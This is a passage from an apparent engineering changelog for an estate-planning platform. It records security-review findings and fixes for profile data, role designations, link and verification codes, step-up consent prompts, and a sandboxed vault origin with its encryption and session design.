   `permission.revoked` in the audit catalog. An owner could widen a
   role-holder's reach and never see or withdraw it — the inverse of the M6 rule
   that the protective action must never be harder than the permissive one. Now
   a list route, a revoke route, and the audit action. Revoke is
   `CallerGuard`-ONLY while granting is gated, deliberately: that asymmetry IS
   the M6 rule. Revoking the whole ASSIGNMENT stays gated, because that destroys
   a designation the estate depends on rather than narrowing one.
4. **`PUT /v1/profile` silently destroyed the SSN on any edit (new).** The upsert
   was a full replace and `ssn` was optional, but `GET /v1/profile` returns
   `ssnLast4` and NEVER `ssn` — by design, since the full value is the most
   sensitive column in the product. So no client could round-trip the row:
   read the profile, change one field, PUT it back, and `ssn_ct` and
   `ssn_last4_ct` both went NULL. `dob`/`address`/`phone`/`occupation` share the
   replace semantics but ARE returned, so they survive a round trip; the SSN
   structurally cannot. Latent for the same reason as (2) — nothing called the
   route — and PR2's whole purpose is a form over it. Absent now means unchanged
   and explicit `null` means clear, applied to every optional field of the
   profile rather than special-cased for the SSN.
   **The carry moves CIPHERTEXT, never plaintext.** Decrypting the untouched
   fields to re-encrypt them would put the full SSN through the process on every
   unrelated edit and emit a `crypto.field.decrypted` on `profile.ssn` each
   time, turning a change of address into a logged read of that value. Copying
   stored bytes is both cheaper and strictly less disclosure. It is sound only
   while carried and new bytes share one key, which a single `dek_id` column
   plus the partial unique index guarantee; a row written under a retired DEK
   (i.e. crypto-shredded) is REFUSED with `409 profile_key_retired` rather than
   stamped with a live key id, on the M4 rule that a shredded record is Gone,
   not a fresh live key.
5. **Deleting a contact silently retired its fiduciary designations (new).**
   Every query that resolves a role holder joins `contacts ... AND c.deleted_at
   IS NULL` — profile's `effectiveContactReadGrants`, settlement's
   `isLinkedContact` / `isExecutorOf` / `reportableEstates` — but the
   `role_assignments` rows have their own `deleted_at` and were untouched. So one
   contact delete un-resolved an executor on the §5.1 chain and disabled every
   grant it carried, while `GET /v1/role-assignments` kept listing the
   assignment and no `role.revoked` was emitted anywhere. Both halves are wrong:
   retiring a fiduciary is a deliberate, step-up-gated, separately audited act
   and must not be reachable as a side effect of tidying an address book, and a
   control that stops working without saying so is the fail-open this repo keeps
   finding. Now `409 contact_in_use` until the roles are revoked.
6. **Recorded, not a defect:** contact and family-member reads decrypt every
   field, and `FieldCipher` emits one `crypto.field.decrypted` per non-null
   field, so a twenty-contact list is ~100 audit events on the owner's own trail
   per page load. The DEK cache means it is not 100 KMS calls, but it is exactly
   the per-principal decrypt-rate baseline docs/03 §4 TB4 calls the single most
   important insider control. This is PR2's design constraint (M12's
   audited-decrypt-volume rule, stricter here), not something PR1 changes.

**Every fix is mutation-proven, and one mutation exposed a vacuous test.** The
service-level unit test for (2) PASSED with `linked_user_id = NULL` put back into
the repo's UPDATE, because it fakes the repo and so cannot see SQL — the defect
lived in a statement no unit test observes. The assertion moved to
`profile.int.spec.ts` against real Postgres, where reintroducing the column
turns two tests red. All six were then re-mutated against the database
(re-add the column; drop the guard; restore absent-means-NULL; skip the
in-use check; drop the revoke audit event; widen the revoke predicate to ignore
`role_assignment_id`) and each is confirmed to fail.

Coverage floors re-measured and ratcheted up, never lowered: profile
62/58/40/60 → 72/70/49/70 (local, no PG: 73.44/71.47/50.34/71.17; with PG the
same suites reach 87/77/85/86). The floors stay satisfiable without Postgres so
local runs are honest, which is the existing convention.

**The new gate broke the settlement e2e, which is the gate working.**
`seedEstate` named an executor and a viewer on the owner's ordinary session.
Rather than weaken the seed to raw SQL, it now seeds through a SECOND,
step-up-elevated session: step-up freshness is a property of a session
(identity's `grantStepUp` takes a `sessionId`), so the owner's primary session
stays un-elevated and the owner-void test still observes `stepup_required` on it
— and the seeding step-up stays strictly OLDER than any case reported
afterwards, which is what keeps it clear of the M7 owner-liveness interlock.
TOTP enrollment is now cached per user, because `enrollTotp` only revokes
UNVERIFIED methods and enrolling twice would leave a user with two verified
secrets and make `findActiveTotp`'s choice decide whether a later step-up works.

#### PR2 — the surface (BFF's fourth non-identity downstream)

`/people` becomes a real destination and the "Soon" preview retires. The
load-bearing decision is the DECRYPT BUDGET: contact PII lives under the owner's
DEK and every field read is one audited `crypto.field.decrypted`, so the list
route was narrowed to a summary — one decrypt per row plus two plaintext columns,
with `has*` flags derived from column nullity so a row says WHAT is on file
without reading it. Email/phone/address/notes have no field on the GraphQL
summary type at all, so no query can ask incidentally. Narrowing the SHARED route
also tightens §5.5 for a grant-holder, which is why there is one projection and
not two. Proven against the live stack's audit chain: `contact_list` decrypted
only `contact.name` across five page loads.

THE SSN IS DISPLAYED AND NEVER COLLECTED, by construction. No `ssn` argument on
the mutation, no field in the BFF client, no input in the app — only `ssnLast4`,
read-only, so an owner can see whether we hold one. With PR1's merge semantics
that makes the column safe from this direction: a browser edit changing state
CA→AZ left `ssn_ct`, `ssn_last4_ct` and `dob_ct` intact, and `profile.ssn` never
appears in the decrypt trail at all — the carry moves ciphertext, so the full
number was not decrypted even while saving.

A DESIGNATION IS NOT ACCESS, said out loud: each condition carries its own
sentence, `on_death_verified` states that a death must be reported, reviewed and
confirmed after a waiting period, and a role with no permission says it reads
none of the estate. Whether a contact has an account is shown too, as THREE
values — a failed read passes null, not false, because "no account yet" is a
claim about someone's estate.

Three-way step-up asymmetry in one component: naming a role prompts inline and
retries; REMOVING one prompts too (equal, never harder — revoking destroys the
executor-resolution path); withdrawing a permission is one click. `StepUpPrompt`
extracted at its third caller, with the two earlier ones left alone and the
reason recorded (DocumentGenerator's prompt is inside a form; this renders one).

Two service changes, both narrowings: the list projection, and owner-relative
`GET /v1/contacts` + `/v1/contacts/:id` (the `/v1/profiles/:ownerUserId` routes
are the cross-owner ABAC boundary and always were).

#### PR3 — the contact link ceremony

`contacts.linked_user_id` had no write path in the platform. Four test files set
it with raw SQL and said so, which is why nobody could report a death, exercise a
granted read, or be resolved as an executor. The ceremony: owner mints a 160-bit
single-use code under step-up, the server stores only its sha256, the owner is
shown it ONCE and delivers it out of band (the M6 grantee-fingerprint
precedent), and the contact redeems it while authenticated on their own existing
account.

Shape forced by two shipped decisions and one threat: M9's notification doctrine
has no content field and forbids links, so an emailed invite would contradict it;
§6b's anti-enumeration property must survive, so the code is the ONLY selector on
redemption and the route takes no id of any kind; and the redeemer must already
have an account, so this cannot become an invite-to-register flow.

Full record in docs/03 §6g, including the flagged deviation (redemption takes no
Cedar decision — the authority is the capability, because the redeemer has no
relationship to the estate until it succeeds) and four accepted residuals.
Profile becomes the third holder of the notifications SEND credential and
deliberately not of the RECIPIENTS one, so it can never repoint where alerts go.
Redemption REFUSES in production behind a stub notifier: a claim the owner never
hears about is how a mis-delivered code becomes an invisible authorization edge.

Atomicity is a control here, not hygiene — spending the invitation and writing
the link share one transaction with each statement restating its preconditions,
so two concurrent redemptions produce exactly one link and the loser rolls back.
A spend with no link would lock that contact out of ever being linked.

Mutation-proven: dropping the self-redemption refusal, storing the code in
plaintext, and dropping the mint's step-up each turn the suite red.

#### M13 security review (2026-08-06)

Five discovery lenses over the three-PR range plus TWO adversarial verifiers per
candidate on different angles — reachability in a real production config, and
is-it-already-a-documented-decision — both told to default to refuted. Run in two
passes: the first fan-out lost four lenses to stalled agents (a whole-range
`git diff` over 9.5k lines), so they were re-run with FILE-SCOPED prompts and the
loss is recorded here rather than papered over. 21 raw findings, 21 unique, 6
confirmed, 10 refuted, 7 dropped under the verification cap and hand-verified —
each dropped one logged by name, the M12 rule.

**Seventh milestone running where every confirmed finding sits in machinery the
milestone itself introduced, and most falsify a claim it made about itself.**

1. *An owner notification of a claimed link could be skipped or swallowed with no
   record (medium, both verifiers confirmed).* The audit emit ran BEFORE the
   notify and propagates broker failures by design (the M8 loudness rule), so an
   MSK blip after the commit exited `redeem()` with the link standing, the owner
   untold, and — the code being spent — no retry that could ever tell them. The
   notify's empty catch cited "the claim event above" as the record when that
   event carried no delivery fact; `notifications.ts` claimed "the caller records
   the failure" and no caller did; and a network-level failure reached no
   notifications-service row either, so nothing anywhere knew. FIXED: the notify
   runs FIRST (an audit hiccup must not cancel the control that makes the
   ceremony's trust anchor auditable by the owner; the invitation row is the
   durable claim record), and the outcome rides the claim event as
   `ownerNotified: delivered|failed` — the vault delivered_at-NULL precedent, so a
   failure is an operator's re-drive signal instead of silence.
2. *The step-up retry ran the WRONG ACTION (high).* When a permission widen was
   refused, the post-elevation retry called `grantRole()` from the picker's
   current state: a genuine TOTP challenge minted an `executor` /
   `on_death_verified` designation the owner never chose — onto the §5.1
   executor-resolution chain, fully audited as theirs — and silently dropped the
   permission they had clicked. Three claims said otherwise (the in-code "Elevate,
   then retry", `StepUpPrompt`'s "re-run the action that was refused", and the M13
   PR2 log entry), and the one existing test asserted only that the prompt
   OPENED, so the suite was green over it. FIXED with a discriminated union that
   CARRIES every argument the retry needs, plus per-action wording — the consent
   ceremony was also mis-stating what it authorized.
3. *Prompt-and-retry was defeated for up to 30s by the session verifier's positive
   cache (medium).* Every service uses the 30s default, so after a genuine
   elevation the peer still answered from a cached un-elevated session and the
   single-shot retry left the prompt sitting there doing nothing — which is
   exactly what happened when this surface was first driven in a browser. The
   platform-wide TTL is a recorded trade-off (2026-07-23); what M13 got wrong was
   claiming a retry that always works. FIXED by making it true: `onElevated`
   reports `applied | stale` and the prompt polls to a documented deadline, the
   same contract the stack e2e already treats as the contract rather than a flake.
   The window is pinned to `auth-guard`'s own constant by a spec that READS that
   file — the compose-parity mechanism, because the web app cannot import a Nest
   package and a duplicated number drifts.
4. *`contact_in_use` was check-then-act (medium).* A `grantRole` committing between
   the service's check and the soft delete would delete a contact that had just
   acquired a designation — the exact fail-open §6f declares Closed. FIXED by
   moving the predicate into the UPDATE's own `WHERE` and returning a
   discriminated outcome, so "nothing to delete" (404) stays apart from "a
   designation stands in the way" (409). The now-callerless
   `hasLiveAssignmentsForContact` was deleted rather than left as dead code.
5. *`grantRole` never checked the contact (refuted as escalation, fixed as
   hardening).* The FK proves existence, not ownership or liveness. Every
   consequence was self-inflicted — all resolvers scope by owner — but a
   cross-owner designation resurrected the silent-retirement shape PR1 closed: the
   OTHER owner's `contact_in_use` check is owner-scoped and would never see the
   assignment, so their delete silently un-resolved it. Now a uniform not-found.
6. *Two doc/comment mismatches and a half-implemented alphabet (low).* The
   migration said the code carries 128 bits when it delivers 160; redemption
   hashed the RAW submission although the alphabet exists to be read aloud, so
   lowercase, dropped dashes, or a typed O-for-zero all failed with the uniform
   refusal and the owner's only remedy was a fresh code. FIXED: the bit count, and
   a `canonicalCode` fold that is strict onto the minted alphabet (so it cannot
   make two mintable codes collide) applied on BOTH sides of the hash.

**Hardening, not an observed defect — and the distinction is the point.**
`role_assignments` had no uniqueness of any kind: nothing in the schema, the repo
or the service stopped a double-submit or a retry from minting two identical live
designations, which is a real gap and is now closed with a partial unique index
(COALESCE'd scope, because SQL uniqueness treats NULLs as distinct and
whole-estate is the commonest case) plus a `409 role_already_granted`. Revoking
"the" designation would otherwise leave a duplicate conferring everything it
conferred before, and on the §5.1 chain "revoked" has to mean revoked.

CORRECTED, because the first version of this entry claimed the live stack had
EXHIBITED the bug. It had not. Two `executor` / `on_death_verified` rows in the
stack's core database were read as a duplicate pair from a two-line
`SELECT role, effective_condition` listing — while the
`GROUP BY owner_user_id, contact_id, role` query run minutes earlier had already
returned nothing, which was the correct answer. They belonged to two different
owners and two different contacts. The migration's own pre-flight settled it
independently: run against that database it APPLIED rather than refusing, which
is only possible if no duplicate group existed. The gap is real; the sighting was
not, and a doc claiming evidence it does not have is the defect class this repo
treats as real.

**And the duplicate-designation fix produced a second finding on its own.** The
index was first APPENDED TO 003, a migration the migrator had already recorded.
That is wrong, but CORRECTED AS TO WHY — the first version of this paragraph said
the migrator "keys on FILENAME, so the edit silently never runs", and that is
false. `packages/db/src/migrator.ts` records a sha256 CHECKSUM alongside every
applied name and raises `MigrationDriftError` on a mismatch, so appending to 003
fails LOUDLY on the next run rather than doing nothing: even editing a comment in
an applied file blocks the next migration until the file is restored. What was
actually observed was a container still running the pre-edit 003 — the second time
in that session a stale image was mistaken for evidence about the code, which is
worth recording as its own recurring mistake. The conclusion survives (migrations
are append-only) and its enforcement is stronger than the doc credited it with.
It is `004_role_assignments_unique.sql` now, with a
pre-flight that RAISES over pre-existing duplicates and retires nothing — the
`002_dek_unique_active` rule, for the same reason: duplicates are identical as
designations but not as rows, and `permission_grants.role_assignment_id`
references the row, so retiring the spare would silently revoke every grant
hanging off it. `role-unique-migration.int.spec.ts` covers both properties, and
one of its cases exists specifically to catch the appended-to-003 mistake (it
asserts the file appears in `applied` AND that the index really exists).

**One of those tests was itself vacuous, and mutation caught it.** A case named
"the COALESCE matters" seeded two whole-estate duplicates and asserted the
migration refused — which passes with or without the COALESCE, because the
pre-flight's `GROUP BY` treats NULLs as equal while a `UNIQUE INDEX` does not. It
was named for a property it never touched. Rewritten to migrate a CLEAN database
and then ask Postgres to accept the duplicate, which is the only way to exercise
the index's own predicate.

Every fix is mutation-proven: restoring the old notify ordering, folding the
permission retry back into the role variant, dropping the atomic `NOT EXISTS`,
dropping the unique index, dropping the COALESCE, removing the pre-flight, and
re-appending the index to 003 each turn the suite red. Docs/03 §6f and §6g
updated, including the family-list narrowing recorded as a deliberate scope-down
rather than an omission.

#### M13 review round 3 — the fixes themselves (2026-08-06)

A third pass was run over ROUND 2's OWN FIXES, on the repo's five-for-five
expectation that new trust machinery is defective. It was justified: two HIGH
defects, both in code written to close a finding.

1. **CANCEL DID NOT CANCEL.** Round 2 made the step-up prompt POLL — peers learn
   about an elevation through a 30-second positive session cache, so a single-shot
   retry left the prompt idle after an accepted code. The retry loop had no abort,
   and `Cancel` only asked the parent to hide the prompt: for up to the whole
   propagation budget after the owner declined, the loop kept retrying and could
   still APPLY the action. Measured against the real component — a third
   `GrantRole` was issued after Cancel, it succeeded, and an
   `executor`/`on_death_verified` designation landed on the §5.1
   executor-resolution chain with no UI signal at all, because React 19 makes the
   post-unmount `setState` a silent no-op. A step-up prompt is a consent ceremony;
   proceeding after consent is withdrawn is the one thing it must never do. FIXED
   with an `abandoned` ref set by Cancel AND by unmount, checked in the loop
   condition, after the sleep, and around the identity round trip; re-armed on a
   fresh submit so cancelling one attempt cannot veto the next.

2. **THE DELETE/GRANT RACE WAS STILL A RACE.** Round 2 replaced contact deletion's
   check-then-act with a single `UPDATE … WHERE NOT EXISTS (SELECT … FROM
   role_assignments)`, which reads atomically but locks the CONTACTS row, not the
   assignments it consulted — and `grantRole` was itself a check-then-act on the
   contact's existence. Two concurrent statements could therefore delete a contact
   and name it to a role, leaving a designation pointing at a deleted contact: the
   in-use refusal M13 PR1 added, defeated. FIXED by making the contact row the
   serialization point for both paths — `softDelete` takes `SELECT … FOR UPDATE` on
   it inside a transaction, and `RolesRepo.insertForLockedContact` takes the same
   lock before inserting (the plain `insert` is deleted, so no caller can skip it).
   A five-iteration concurrent race test asserts the impossible pair never occurs
   and fails 3/3 runs with the `FOR UPDATE` removed.

Three further items from the same pass, each real and none of them a vulnerability
on its own:

- `permission_grants` had no uniqueness either, and `grantPermission` was the ONE
  retried action with no in-flight guard — its buttons stayed live during a write.
  Two clicks wrote two grants, of which withdrawing the visible one left the other
  conferring the read. Closed at both levels: migration
  `005_permission_grants_unique.sql` plus a `409 permission_already_granted`, and a
  `busy` guard with a test that clicks twice against a held-open response.
- Neither new 409 had a BFF mapping, so the "ordinary refusal" the migrations
  promised surfaced as a masked server error. Mapped, with copy that states the
  outcome and offers no remedy — neither conflict is the user's mistake.
- `FakeContactsRepo.softDelete` dropped its `ownerUserId` argument, leaving the
  delete path's ONLY access control unmodelled — the real repo's `owner_user_id`
  predicate is the whole check there, since the PEP models the resource owner as
  the caller. Made faithful, with a test asserting another owner's contact is a
  uniform not-found (never a 403, which would confirm the id names something).
- The redeem schema's `min(8)` measured the RAW submission, so a body of pure
  separators satisfied it and folded to the empty string. Redemption now measures
  the CANONICAL form against a `CANONICAL_CODE_LENGTH` derived from the mint, and
  answers the same uniform `invalid_code` so the shape check is not an oracle for
  the format.
- Two error-path bugs in `004`'s `RAISE`, found only by making the branch fire:
  plpgsql's placeholder is a bare `%`, so the original `%s%s` wedged stray "s"
  characters into the duplicate list, and the first correction to `%%` — an escaped
  percent, zero placeholders — made the branch a hard error. An exception nobody
  triggers in a test is an exception nobody has read.

### M14 — address ownership (shipped 2026-08-07)

The milestone that makes three shipped fail-closed controls mean what they
claim. Full threat-model delta in docs/03 §6h; the design decisions are in
CLAUDE.md's log. Four PRs:

- **PR0 (#47)** — `notification_sends`' kind CHECK had fallen behind the wire
  enum since M13, and the path was LIVE (`PROFILE_NOTIFY_MODE=http` in both
  stack profiles). Every real link claim mailed the owner, threw on the INSERT,
  emitted no `notification.sent`, and recorded `ownerNotified: "failed"` about
  an owner who HAD been warned — an audit claim that INVERTS rather than a row
  that is merely missing. Split out because a live defect must not hide inside
  a feature branch.
- **PR1 (#48)** — the ceremony, plus two new credential-graph edges
  (`NOTIFICATIONS_VERIFY_INTERNAL_TOKEN`, `NOTIFICATIONS_STATUS_INTERNAL_TOKEN`)
  and every fence. The fence was made RED FIRST (10 failing assertions) and
  green after.
- **PR2 (#49)** — the gate classification applied per call site, the
  `recipientVerified` port method, and `sent_unverified`. Proven live under full
  production config: escrow configure refused, the ceremony ran against a real
  SES message, the same request was admitted, and settlement intake proceeded
  while recording — the whole table in one audit trail.
- **PR3 (#50)** — the surface: an app-wide banner and the Security-page
  ceremony.

#### M14 security review (2026-08-07)

Five discovery lenses over NAMED FILE LISTS (never a diff range — the M13
lesson), then two adversarial verifiers per candidate on different angles
(production reachability; already-a-decision), both told to default to refuted.
The verifiers refuted or downgraded five of the candidates put to them, which is
the point of running them.

EIGHTH milestone running where every confirmed finding sits in machinery the
milestone introduced, and most falsify a claim it made about itself. Two were
load-bearing, and both were mine.

1. **AN EXPIRED CODE WEDGED THE ACCOUNT PERMANENTLY.** The partial unique index
   enforcing "one live code per user" cannot carry an expiry predicate — a
   partial index cannot reference `now()` — while `findLive`, which decided
   whether to retire the old code, could. Retirement ran only when `findLive`
   saw a row, so once a code lapsed nothing ever cleared it: the next insert
   took the unique violation, the ceremony answered `too_soon` forever, and the
   account could never be verified again. Every M14 arming gate then refused it
   permanently. The trigger was ignoring the first email. M14 had replaced "the
   gate is satisfied without proof" with "the gate can never be satisfied".
   THREE claims contradicted it, including an int-spec comment asserting a
   re-mint the test never checked — the M13 "a test named for a property it
   never touched" shape, reproduced. Fixed by retiring unconditionally, keyed on
   the index's own predicate; `findLive` now also matches `verify()` on
   `attempts`, so all three notions of liveness agree.
2. **THE RESEND ROUTE HAD NO RATE LIMIT WHEN SENDS WERE FAILING.** The
   re-issue floor was checked only when a live code existed — but a send that
   fails RETIRES its code, so in exactly the state where sends fail there was no
   live code and the floor was skipped entirely. The floor keys on the last MINT
   now, which is the question it was always asking.
3. **VAULT RESET RECORDED EVERY NOTIFICATION AS DELIVERED.** PR2 changed the
   port from throw-based to outcome-based and updated every call site except
   `vault.service.ts` — so the `catch` was unreachable and `deliveredAt` was
   stamped unconditionally, on the one route where a bearer token destroys a
   Zone A vault and where that record is the only compensating control the
   route's own docstring names. Reset also discarded `recipientVerified`, so it
   was the one path that could never emit the evidence event.
4. **A CRYPTO-SHREDDED RECIPIENT STILL VOUCHED FOR ITSELF.** Shredding destroys
   the DEK, not the row, so `findStatus` answered `verified: true` for an
   address the service could no longer decrypt: the arming gates would ARM while
   every alert recorded `carrier_failure`. Migration 003 claimed the opposite as
   "fail-closed by construction" and said the specs asserted it; only the
   soft-delete half was tested. Latent (no in-repo caller destroys a DEK) and
   fixed anyway, because it arms itself the day an erasure route lands.
5. **THE VERIFICATION CODE FIELD ACCEPTED 64 CHARACTERS OF ENGLISH.**
   `/^[0-9A-Z-]+$/` against a minting alphabet that excludes I, L, O and U, next
   to a comment claiming it "admits identity's alphabet and nothing else". The
   pattern now lives in the WIRE CONTRACT both services import, with an identity
   spec asserting every minted code satisfies it — one declaration instead of
   two free to drift, which is why the obvious fix (tighten the regex locally)
   was rejected.
6. **I SILENTLY DISABLED A FENCE.** The credential-graph spec matched outbound
   wiring with `/(?:serviceCredential|credential)\s*:\s*config\.(\w+)/`; PR1
   changed every notifications client to `credentials: { send: config.X }`,
   which that regex does not match. Identity, profile and notifications were
   checked on ZERO credentials. The scan is keyed on the CONFIG FIELD now — a
   property name is a caller's choice and can be renamed into invisibility,
   which is exactly what happened — and it carries the anti-vacuity floor the
   file header already claimed every scan had.

Also fixed: an outage recorded as a failed verification (`verification_
unavailable` now has its own action, so it cannot pollute the trail that says
somebody is guessing at a user's codes); the send edge's `grants` sentence and
three restatements of it, which claimed no delivery state was exposed; a BFF
interface docstring that would have led a second implementation straight back
into the M12 `INVALID_CREDENTIALS` collision; profile's evidence event dropping
the contact id it held; and settlement's evidence emit sharing a catch written
for carrier failures.

**The root cause of four of the ten**, named by a verifier: M14 shipped 84 files
of code and ZERO lines of documentation, so every sentence it invalidated was
still standing — including a citation pointing at a docs/03 §6c passage that
recorded the opposite. docs/03 §6h now exists and that citation points at it.
### M15 — The vault surface: Zone A in the browser (PR1–PR4 shipped)

The largest remaining zero-callers gap in the repo: `apps/services/vault` has
exposed **22 owner-facing routes since M6 with no consumer anywhere**. M6
deferred the UI explicitly — "a vault surface needs the isolated-origin and
CSP/Trusted-Types work of docs/03 TB6 and deserves its own milestone" — and M14
removed the last blocker in front of the emergency-access half by making the
address-verification gate real. This milestone is also the first consumer of the
16-symbol grantee fingerprint the M6 security review widened for a client that
did not exist yet.

Four PRs: **PR1** the origin, the handoff and the fences, with no vault crypto
behind it; **PR2** the vault core (setup, unlock, item CRUD, reset); **PR3**
emergency access on both sides; **PR4** the security review.

**PR1 — prove the boundary before putting keys behind it.**

- **The origin is a different HOST, and that was measured rather than reasoned.**
  Cookie scope IGNORES THE PORT: a probe served on an unrelated port was handed a
  real `estate_access`/`estate_refresh` pair from a previous stack run, so a vault
  surface at `localhost:3010` would have received the app's full session on every
  request. `vault.localhost` receives none of them, and `*.localhost` is a
  potentially-trustworthy origin, so the `__Host-` prefixed `Secure` cookie is
  accepted there over plain http. The prefix is unconditional in every
  environment — unlike the BFF's `Secure`, which is production-only — because a
  conditional prefix would have the dev profile exercising a different cookie
  from the production one.
- **`apps/vault-web` is framework-free, and that is the security decision of the
  PR.** M6's own TB6 argument is that the code holding the only keys to a vault
  has no transitive tree; putting Next and React on that origin would place a
  large tree there and ask a CSP to compensate. Hand-written DOM instead, which
  is what makes `script-src 'self'` (no `unsafe-inline`, no `unsafe-eval`, any
  environment) and enforced Trusted Types possible rather than declared. Verified
  in a real browser: policy creation refused, `innerHTML` threw with zero nodes
  created, `eval`/`new Function` threw EvalError. Cost: no React, no Tailwind, and
  a visual seam narrowed by COPYING the Evergreen palette rather than importing
  it — an unfamiliar-looking page asking for the most valuable secret in the
  product is what a phishing page looks like.
- **The handoff.** A 160-bit single-use code, minted under step-up, carried by a
  top-level form POST (never a URL, fragment or `Referer`), burned on the
  ATTEMPT, redeemed server-side for a `vault`-audience session of 15 minutes with
  NO refresh token — `refresh_token_h` is NOT NULL, so it holds the digest of a
  value discarded in the same expression. Every failure is one `invalid_code`, on
  the wire and in the audit trail.
- **Audience, deny by default.** `SessionContext` gains `audience`; `CallerGuard`
  admits `account` alone unless a service opts in, and only vault does. Identity
  is per-route because introspection must admit every audience or the origin
  cannot exist; `session`, `stepup` and `logout` widen and `handoff` deliberately
  does not, so a leaked vault session cannot chain another. Both halves declared
  as data (`AUDIENCE_ADMITTERS`, `VAULT_AUDIENCE_ROUTES`) and checked against
  source in both directions.
- **The edge holds no credential**, in either direction — the second component in
  the product of which that is true by design. Asserted as source, runtime and
  deployment facts. It lives at `apps/` rather than `apps/services/` on purpose:
  `SERVICE_NAMES` derives from that directory, and staying out of it keeps the
  origin out of the credential graph. Its proxy is an allowlist of exact routes,
  with identity's entries exact because `startsWith('/api/auth/logout')` also
  matches `/api/auth/logout/refresh`.
- **Seven fences, each mutation-tested red before green.** Zero client
  dependencies · no HTML/script sink with ZERO declared exemptions (the main app
  has one; this origin has none) · `api.ts` the only network call site · no
  `console.*` · no inline script or style in the shell · the audience table
  matches source · identity's per-route widening matches its declaration.

**Two tests of my own that passed for the wrong reason**, both the M13 lesson.
The traversal test used `fetch`, which normalises `/../../x` to `/x` before
sending — measured, the server saw `/package.json` — so the 404 came from the
extension allowlist and no traversal was attempted. Rewritten to a raw socket,
after which a mutation showed the `startsWith(publicDir)` guard is UNREACHABLE
anyway, because the WHATWG `URL` parse collapses `..` and decodes `%2e%2e` first.
The guard stays as defence in depth but is documented as unreachable rather than
credited as the control, and the test now asserts the property. Separately, a
`window.location` stub leaked between cases and made a later test render the
wrong screen.

**One product defect, caught by its own new test.** `VaultLaunch` destructured
`result.data.startVaultHandoff` with no shape guard, so a BFF predating the
mutation would have thrown mid-click — and the alternative failure is a form
posting `code=undefined` at the vault origin. A missing field is no data.

**Driven live in both profiles.** Register → login → TOTP → `/vault` interstitial
→ step-up → form POST → `http://vault.localhost:3010` showing
`Session type: vault`. The audience boundary was measured across every service
(vault 200; assets, documents, profile, assistant 401; identity session 200,
TOTP 401, handoff 401), along with burn-on-attempt, the uniform refusal, the
absent refresh token, and an audit stream whose `failed` events carry no actor
and empty detail.

**Stack counts measured in BOTH profiles rather than derived**, because running
the production assertions against a development stack makes the M14 arming gate
legitimately answer 201 instead of 503 and a derived number would encode that as
a pass. The six vault-origin tests sit outside the profile split (this origin
runs in both): 18/4 → 24/4 development, 9/13 → 15/13 production. `vault-web`
joined the image matrix with an explicit `smokeProduction` flag, and the e2e
fetches `/app/main.js` from the shipped image — closing the class the
`web.Dockerfile` `public/` defect belonged to, since this client is build output
under `public/` too.

**Deliberately deferred, with reasons.** Autofill (needs a browser extension: a
separate distribution artifact with its own supply chain, and an extension
holding vault-origin access reopens TB6 from a direction no CSP can see) ·
encrypted attachments (blobs cap at 68 KiB; M6 recorded the streaming path as the
prerequisite, so the `attachment` item type stays in the enum with no create
path) · family sharing (needs §5.2's per-item scope limits, deferred in M6) ·
item version-history UI · breach/reuse health checks (a k-anonymity lookup is a
third-party egress out of Zone A and needs its own decision). A password
generator DOES ship in PR2 — `crypto.getRandomValues`, no dependency, and
creating a password item without one pushes users toward weak choices.

**PR2 — the vault core.** Zone A becomes usable: setup, unlock, item CRUD,
password change, and the reset that is a crypto-shred. Vault routes 1–12 of the
22 now have a caller.

- **Two builds of one source.** vault-crypto has always shipped CommonJS
  because the vault SERVICE imports its server-side SRP half; the browser needs
  native ES modules with no bundler. `tsconfig.esm.json` emits the same sources
  a second way, and every relative import gained an explicit `.js` — a no-op for
  the CJS output, mandatory for a browser. The client loads it by ABSOLUTE PATH
  from this origin rather than through an inline import map, which is what keeps
  the CSP at `script-src 'self'` with no hash.
- **One module holds every key.** `VaultSession` owns the master key (a
  non-extractable `CryptoKey`), the keyset-auth key, the session token, and —
  only for the password change — the AUK and wrapped master key, because
  re-wrapping needs BYTES a non-extractable key cannot give. `#private` fields,
  not TypeScript `private`, which is erased and leaves enumerable properties
  (the M10 privacy-proxy shape). Dropped on lock, on a 5-minute idle timer, and
  on `pagehide` so a bfcache restore comes back locked.
- **The central claim is driven, not argued.** A recording-transport spec runs
  enrollment, a REAL SRP-6a unlock, a create and a list, then searches every
  recorded byte for the password, the Secret Key, its ungrouped parts and the
  item plaintext — and round-trips an item back through decryption so the blob
  is proven both opaque and openable. Mutation-tested both ways.
- **The Secret Key** is shown once behind an acknowledgement, downloadable as an
  Emergency Kit (the key, deliberately not the password), and remembered in
  IndexedDB by default with an opt-out — with the screen saying plainly that
  under XSS on this origin any persisted key is readable, and that the control
  is the empty dependency tree and the CSP rather than the storage API.
- **One message for both halves of 2SKD.** A wrong password and a wrong Secret
  Key are indistinguishable, because naming which half was wrong would tell
  someone holding a stolen Secret Key that it is the right one.

**Two real defects, both found by tests refusing to pass:** a malformed Secret
Key makes vault-crypto THROW rather than return, so the password-change screen
sat on "Changing…" forever; and the settings screen had two fields sharing the
visible label "New vault password", which is ambiguous to a person and broken
for a screen reader.

**A stale `dist` nearly became the thing under test.** The `.js` extensions made
jest's resolution depend on the built output — moving `dist/` aside made every
import fail, and a run against a stale one was observed at 10.68% coverage with
only the two import-free files instrumented. Both symptoms proved
cache-sensitive and are recorded as observed rather than explained; a
`moduleNameMapper` now makes the suite read `src` regardless. My first write-up
of this asserted a mechanism and a test-count drop I could not reproduce, and
was corrected — the M13 rule about claiming evidence you do not have, applied to
myself.

**Proven live** against a rebuilt stack: setup → Secret Key → unlock over real
SRP → an item created with a generated password. The vault cluster holds 203
bytes of ciphertext with the `0x01` envelope header and **zero** occurrences of
the title or username; the keyset holds a 512-byte verifier, a 61-byte wrapped
master key and PBKDF2-SHA256 at 650k iterations; the audit trail carries
`vault.keyset.created`, `vault.opened`, `vault.items.listed`, `vault.item.created`
with ids and enums only and no vault content anywhere. Trusted Types stayed
enforced with the crypto module loaded, and no key material is reachable from
`window`.

Coverage 88.49/75.54/86.48/90.53, floor ratcheted up.

**PR3 — emergency access, both sides.**

- **A route that had no caller hid a design that could not complete.** M6 wrote
  `vault_keysets.wrapped_private_key` and cleared it on reset, and no route ever
  served it back — so a grantee could never open a share sealed to them, and the
  release path had been structurally incompletable since the milestone that
  designed it. It was invisible because nothing consumed it: the M4 legal-hold
  shape exactly. `GET /v1/vault/recovery-key` closes it, behind an OPEN VAULT
  rather than a session, because the private half is wrapped under the caller's
  own master key and a stolen bearer should not be able to fetch what it cannot
  open.
- **The Zone B read had to cross, and the obvious way to cross it could never
  have worked.** Choosing a grantee needs contact NAMES, which live in profile,
  and profile admits `account` sessions only — so the vault origin's read of
  `/v1/contacts` returned 401 the first time the stack was driven. The shortcut
